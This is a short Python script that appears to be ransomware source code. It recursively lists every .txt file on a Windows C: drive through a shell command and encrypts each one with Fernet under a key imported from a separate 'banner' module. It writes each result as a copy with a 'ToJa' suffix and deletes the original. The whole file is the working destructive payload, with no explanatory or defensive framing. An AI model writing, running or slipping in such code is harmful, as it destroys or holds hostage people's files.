from cryptography.fernet import Fernet
from subprocess import check_output
import os
import banner

enc = Fernet(banner.key2)
  
try:
    cmd = check_output("C: && dir /S /B *.txt",shell=True).decode().split()

    for g in cmd:
        dirlist = open(g,"rb")
        data = dirlist.read()
        enc_data = enc.encrypt(data)
        new_file = open(g+"ToJa","wb")
        new_file.write(enc_data)
        new_file.close()
        dirlist.close()
        os.remove(g)
        
except Exception as ex:
    print(ex)